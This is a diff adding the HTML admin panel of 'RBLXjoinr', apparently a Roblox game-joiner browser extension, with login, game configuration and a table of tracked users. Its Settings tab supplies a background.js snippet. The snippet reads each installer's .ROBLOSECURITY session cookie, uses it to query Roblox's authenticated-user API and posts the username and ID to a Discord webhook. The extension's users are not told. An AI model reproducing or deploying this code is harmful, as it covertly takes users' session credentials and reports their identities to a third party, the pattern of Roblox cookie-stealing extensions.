@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RBLXjoinr – Admin</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="admin.css" />
+</head>
+<body>
+
+  <!-- LOGIN SCREEN -->
+  <div class="login-screen" id="loginScreen">
+    <div class="login-card">
+      <div class="login-logo">RBLX<span class="accent">joinr</span></div>
+      <p class="login-sub">Admin Panel</p>
+      <div class="login-form">
+        <input type="password" id="loginPassword" class="admin-input" placeholder="Enter password" autocomplete="current-password" />
+        <button class="btn btn-primary btn-full" id="loginBtn">Sign In</button>
+        <p class="login-error" id="loginError"></p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ADMIN APP -->
+  <div class="admin-app" id="adminApp" style="display:none;">
+
+    <!-- SIDEBAR -->
+    <aside class="sidebar">
+      <div class="sidebar-logo">RBLX<span class="accent">joinr</span></div>
+      <nav class="sidebar-nav">
+        <a href="#" class="sidebar-link active" data-tab="dashboard">
+          <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+          Dashboard
+        </a>
+        <a href="#" class="sidebar-link" data-tab="games">
+          <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>
+          Games
+          <span class="sidebar-badge" id="gamesBadge">0</span>
+        </a>
+        <a href="#" class="sidebar-link" data-tab="users">
+          <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+          Users
+          <span class="sidebar-badge" id="usersBadge">0</span>
+        </a>
+        <a href="#" class="sidebar-link" data-tab="settings">
+          <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+          Settings
+        </a>
+      </nav>
+      <button class="sidebar-logout" id="logoutBtn">
+        <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
+        Sign Out
+      </button>
+    </aside>
+
+    <!-- MAIN CONTENT -->
+    <main class="admin-main">
+
+      <!-- DASHBOARD TAB -->
+      <div class="tab-content active" id="tab-dashboard">
+        <div class="page-header">
+          <h1 class="page-title">Dashboard</h1>
+          <p class="page-sub">Overview of your RBLXjoinr extension</p>
+        </div>
+
+        <div class="stats-grid">
+          <div class="stat-card">
+            <div class="stat-card-icon purple">
+              <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
+            </div>
+            <div class="stat-card-body">
+              <div class="stat-card-num" id="statTotalUsers">0</div>
+              <div class="stat-card-label">Total Users</div>
+            </div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-card-icon pink">
+              <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>
+            </div>
+            <div class="stat-card-body">
+              <div class="stat-card-num" id="statActiveGames">0</div>
+              <div class="stat-card-label">Active Games</div>
+            </div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-card-icon green">
+              <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+            </div>
+            <div class="stat-card-body">
+              <div class="stat-card-num" id="statUniqueUsers">0</div>
+              <div class="stat-card-label">Unique Users</div>
+            </div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-card-icon blue">
+              <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+            </div>
+            <div class="stat-card-body">
+              <div class="stat-card-num" id="statRecentUsers">0</div>
+              <div class="stat-card-label">Seen This Week</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="dash-bottom">
+          <div class="dash-section">
+            <h2 class="section-heading">Recent Users</h2>
+            <div class="mini-table" id="dashRecentUsers">
+              <div class="empty-state">No users yet. Add users in the Users tab.</div>
+            </div>
+          </div>
+          <div class="dash-section">
+            <h2 class="section-heading">Active Games</h2>
+            <div class="mini-table" id="dashActiveGames">
+              <div class="empty-state">No games configured. Add games in the Games tab.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- GAMES TAB -->
+      <div class="tab-content" id="tab-games">
+        <div class="page-header">
+          <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;">
+            <div>
+              <h1 class="page-title">Games</h1>
+              <p class="page-sub">Configure which games appear in the extension</p>
+            </div>
+            <button class="btn btn-publish" id="publishBtn">
+              <svg width="15" height="15" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+              Save games.json
+            </button>
+          </div>
+          <div class="publish-hint" id="publishHint" style="display:none;"></div>
+        </div>
+
+        <div class="card">
+          <h2 class="card-title">Add Game</h2>
+          <p class="card-sub">Paste a Roblox Game ID or Place ID to add it to the list.</p>
+          <div class="add-game-form">
+            <input type="text" id="gameIdInput" class="admin-input" placeholder="e.g. 920587237" />
+            <input type="text" id="gameNameInput" class="admin-input" placeholder="Game name (optional)" />
+            <button class="btn btn-primary" id="addGameBtn">Add Game</button>
+          </div>
+          <p class="form-hint">The game ID is the number in the Roblox URL: roblox.com/games/<strong>920587237</strong>/game-name</p>
+        </div>
+
+        <div class="card">
+          <div class="card-header-row">
+            <h2 class="card-title">Configured Games</h2>
+            <div class="card-actions">
+              <button class="btn btn-ghost btn-sm" id="exportGamesBtn">Export JSON</button>
+              <button class="btn btn-ghost btn-sm" id="clearGamesBtn">Clear All</button>
+            </div>
+          </div>
+          <div id="gamesList">
+            <div class="empty-state">No games added yet.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h2 class="card-title">Extension Config</h2>
+          <p class="card-sub">Copy this JSON and paste it into your extension's <code>background.js</code> to sync the game list.</p>
+          <div class="config-output" id="configOutput">{}</div>
+          <button class="btn btn-ghost btn-sm" id="copyConfigBtn" style="margin-top:12px;">Copy to Clipboard</button>
+        </div>
+      </div>
+
+      <!-- USERS TAB -->
+      <div class="tab-content" id="tab-users">
+        <div class="page-header">
+          <h1 class="page-title">Users</h1>
+          <p class="page-sub">All Roblox users who have used the extension</p>
+        </div>
+
+      
+        <div class="card">
+          <div class="card-header-row">
+            <h2 class="card-title">User List</h2>
+            <div class="card-actions">
+              <input type="text" id="userSearch" class="admin-input admin-input-sm" placeholder="Search username or ID..." />
+              <button class="btn btn-ghost btn-sm" id="exportUsersBtn">Export CSV</button>
+              <button class="btn btn-ghost btn-sm" id="importUsersBtn">Import JSON</button>
+              <button class="btn btn-danger btn-sm" id="clearUsersBtn">Clear All</button>
+            </div>
+          </div>
+
+          <div class="table-wrap">
+            <table class="admin-table" id="usersTable">
+              <thead>
+                <tr>
+                  <th>#</th>
+                  <th>Username</th>
+                  <th>User ID</th>
+                  <th>First Seen</th>
+                  <th>Last Seen</th>
+                  <th>Actions</th>
+                </tr>
+              </thead>
+              <tbody id="usersTableBody">
+                <tr><td colspan="6" class="empty-state">No users yet.</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+        <!-- Hidden import textarea -->
+        <div class="card" id="importCard" style="display:none;">
+          <h2 class="card-title">Import Users (JSON)</h2>
+          <p class="card-sub">Paste a JSON array of users: <code>[{"userId":"123","username":"Name","firstSeen":"2026-01-01","lastSeen":"2026-01-01"}]</code></p>
+          <textarea id="importTextarea" class="admin-textarea" placeholder='[{"userId":"123","username":"Name"}]'></textarea>
+          <div style="display:flex;gap:10px;margin-top:12px;">
+            <button class="btn btn-primary" id="confirmImportBtn">Import</button>
+            <button class="btn btn-ghost" id="cancelImportBtn">Cancel</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- SETTINGS TAB -->
+      <div class="tab-content" id="tab-settings">
+        <div class="page-header">
+          <h1 class="page-title">Settings</h1>
+          <p class="page-sub">Configure your admin panel</p>
+        </div>
+
+        <div class="card">
+          <h2 class="card-title">Change Password</h2>
+          <div class="settings-form">
+            <label class="form-label">Current Password</label>
+            <input type="password" id="currentPassword" class="admin-input" placeholder="Current password" />
+            <label class="form-label">New Password</label>
+            <input type="password" id="newPassword" class="admin-input" placeholder="New password" />
+            <label class="form-label">Confirm New Password</label>
+            <input type="password" id="confirmPassword" class="admin-input" placeholder="Confirm new password" />
+            <button class="btn btn-primary" id="changePasswordBtn">Update Password</button>
+            <p class="form-msg" id="passwordMsg"></p>
+          </div>
+        </div>
+
+        <div class="card">
+          <h2 class="card-title">Data Management</h2>
+          <p class="card-sub">All data is stored locally in your browser's localStorage.</p>
+          <div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:16px;">
+            <button class="btn btn-ghost" id="exportAllBtn">Export All Data</button>
+            <button class="btn btn-danger" id="resetAllBtn">Reset All Data</button>
+          </div>
+        </div>
+
+        <div class="card">
+          <h2 class="card-title">Extension Integration</h2>
+          <p class="card-sub">To have the extension automatically report new users, add this snippet to your extension's <code>background.js</code>. Replace the webhook URL with your own.</p>
+          <div class="config-output" style="font-size:12px;">// Report user to admin panel via Discord webhook
+chrome.cookies.get({url:'https://www.roblox.com', name:'.ROBLOSECURITY'}, function(cookie) {
+  if (!cookie) return;
+  // Fetch username from Roblox API, then POST to your webhook
+  fetch('https://users.roblox.com/v1/users/authenticated', {
+    headers: { Cookie: '.ROBLOSECURITY=' + cookie.value }
+  }).then(r => r.json()).then(user => {
+    fetch('YOUR_DISCORD_WEBHOOK_URL', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        embeds: [{ title: 'New User', fields: [
+          { name: 'Username', value: user.name, inline: true },
+          { name: 'User ID', value: String(user.id), inline: true }
+        ]}]
+      })
+    });
+  });
+});</div>
+        </div>
+      </div>
+
+    </main>
+  </div>
+
+  <!-- TOAST -->
+  <div class="toast" id="toast"></div>
+
+  <script src="admin.js"></script>
+</body>
+</html>
